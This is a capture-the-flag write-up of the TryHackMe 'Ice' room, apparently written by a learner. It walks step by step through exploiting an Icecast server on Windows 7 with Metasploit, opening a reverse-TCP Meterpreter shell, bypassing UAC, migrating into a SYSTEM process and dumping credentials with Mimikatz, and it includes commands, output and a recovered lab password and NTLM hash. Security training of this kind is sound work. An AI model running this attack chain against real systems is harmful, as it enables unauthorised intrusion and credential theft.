# TryHackMe — Ice Room Writeup
> **Date:** March 2026  
> **Difficulty:** Easy  
> **OS:** Windows 7  
> **Category:** Exploitation, Privilege Escalation  

---

## Summary

This room covers exploitation of a vulnerable **Icecast streaming media server** running on a Windows 7 machine. After gaining initial access, we escalate privileges to SYSTEM using a UAC bypass, migrate to a stable process, and dump credentials using Kiwi (Mimikatz).

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Finding the Exploit](#2-finding-the-exploit)
3. [Setting Up and Running the Exploit](#3-setting-up-and-running-the-exploit)
4. [Local Privilege Escalation](#4-local-privilege-escalation)
5. [Process Migration](#5-process-migration)
6. [Credential Dumping](#6-credential-dumping)

---

## 1. Reconnaissance

```bash
sudo nmap -sS -sV 10.130.146.212
```

### Results

| Port | State | Service | Version |
|------|-------|---------|---------|
| 135 | open | msrpc | Microsoft Windows RPC |
| 139 | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | open | microsoft-ds | Windows 7 - 10 |
| 3389 | open | tcpwrapped | RDP |
| 5357 | open | http | Microsoft HTTPAPI 2.0 |
| **8000** | **open** | **http** | **Icecast streaming media server** |

### Key Findings
- **Hostname:** DARK-PC
- **OS:** Windows 7
- **Main target:** Icecast on port 8000 — known vulnerable to CVE-2004-1561

---

## 2. Finding the Exploit

```bash
msfconsole
search icecast
```

Found module:
```
exploit/windows/http/icecast_header
```

---

## 3. Setting Up and Running the Exploit

```bash
use exploit/windows/http/icecast_header
set RHOSTS 10.130.146.212
set LHOST 192.168.134.226
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

### Output
```
[*] Started reverse TCP handler on 192.168.134.226:4444
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: Dark-PC\Dark

meterpreter > sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
Meterpreter     : x86/windows
```

> **Note:** We have a shell but only as user `Dark` — not SYSTEM yet. Need to escalate.

---

## 4. Local Privilege Escalation

### Step 1 — Find local exploits
```bash
run post/multi/recon/local_exploit_suggester
```

### Results — Vulnerable modules found
```
exploit/windows/local/bypassuac_eventvwr     → Vulnerable
exploit/windows/local/bypassuac_comhijack    → Vulnerable
exploit/windows/local/ms15_051_client_copy_image → Vulnerable
```

### Step 2 — Run UAC bypass
```bash
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST 192.168.134.226
run
```

### Step 3 — Confirm elevated privileges
```bash
meterpreter > getprivs
```
```
SeDebugPrivilege
SeImpersonatePrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
... and many more
```

---

## 5. Process Migration

Migrated to a stable SYSTEM process for persistence:

```bash
meterpreter > ps
# Selected: spoolsv.exe (PID 1276) running as NT AUTHORITY\SYSTEM

meterpreter > migrate 1276
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 6. Credential Dumping

Loaded Kiwi (Mimikatz) to dump credentials:

```bash
meterpreter > load kiwi
meterpreter > creds_all
```

### Results

| Username | Domain | Password |
|----------|--------|----------|
| Dark | Dark-PC | **Password01!** |

### NTLM Hash
| Hash | Type | Cracked |
|------|------|---------|
| 7c4fe5eada682714a036e39378362bab | NTLM | Password01! |

---

## What I Learned

- How to identify and exploit a vulnerable media server (Icecast)
- How to use `local_exploit_suggester` to find privilege escalation paths
- How UAC bypass works with `bypassuac_eventvwr`
- How to migrate to a SYSTEM process for stable access
- How to use Kiwi/Mimikatz to dump plaintext credentials from memory

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Reconnaissance |
| Metasploit | Exploitation and post-exploitation |
| Meterpreter | Remote access |
| Kiwi (Mimikatz) | Credential dumping |
| CrackStation | Hash cracking |